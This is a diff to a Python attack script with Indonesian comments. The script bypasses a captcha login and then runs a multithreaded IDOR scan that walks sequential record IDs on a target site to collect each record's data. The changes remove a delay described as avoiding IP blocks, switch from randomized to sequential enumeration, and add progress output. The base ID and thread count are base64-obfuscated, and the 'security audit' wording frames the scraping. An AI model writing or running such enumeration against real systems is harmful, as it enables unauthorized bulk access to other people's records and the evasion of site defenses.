@@ -45,6 +45,7 @@ session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 lock = threading.Lock()
 hasil_data = []
 total_checked = 0
+total_to_scan = 0
 
 def login():
     print("[*] Initiating Security Audit: Captcha Bypass Testing...")
@@ -83,20 +84,21 @@ def login():
         return False
 
 def fetch_data(id_num):
-    global total_checked
+    global total_checked, total_to_scan
     # Sesuaikan padding menjadi 12 agar sama dengan Opsi 2 yang sudah berhasil
     formatted_id = str(id_num).zfill(12)
     url = BASE_TARGET_URL + formatted_id
     
     try:
         res = session.get(url, timeout=10)
-        time.sleep(0.3) # Jeda singkat untuk menghindari blokir IP
         
         with lock:
             total_checked += 1
-            # Menampilkan heartbeat setiap 50 ID agar user tahu script tidak hang
-            if total_checked % 50 == 0:
-                print(f"[*] Scanning... Checked {total_checked} IDs", end='\r')
+            # Menampilkan progress per ID: [Current/Total]
+            print(f"[*] Scanning ID {formatted_id} ({total_checked}/{total_to_scan})", end='\r')
+
+        # Jika response melambat, beri sedikit jeda
+        if res.elapsed.total_seconds() > 2: time.sleep(0.5)
 
         if res.status_code != 200: return
 
@@ -349,8 +351,11 @@ def vulnerability_audit():
     except: pass
 
 def start_process(id_list):
+    global total_checked, total_to_scan
+    total_checked = 0
+    total_to_scan = len(id_list)
     if login():
-        print(f"[*] Starting Accelerated Randomized IDOR Scan for {len(id_list)} records...\n")
+        print(f"[*] Starting IDOR Scan for {total_to_scan} records (Sequential)...\n")
         with ThreadPoolExecutor(max_workers=int(_decode("Mg=="))) as executor:
             executor.map(fetch_data, id_list)
         print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
@@ -378,9 +383,9 @@ def main_menu():
             try:
                 count = int(input("[?] Jumlah data yang ingin di scan: "))
                 BASE_ID = int(_decode("NTAyMDEz")) 
-                # Membuat list ID dan mengacaknya (Opsi 2 Random)
+                # Membuat list ID secara urut (Sequential)
                 id_pool = list(range(BASE_ID, BASE_ID + count))
-                random.shuffle(id_pool)
+                # random.shuffle(id_pool) <-- Baris ini dinonaktifkan
                 start_process(id_pool)
             except ValueError:
                 print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
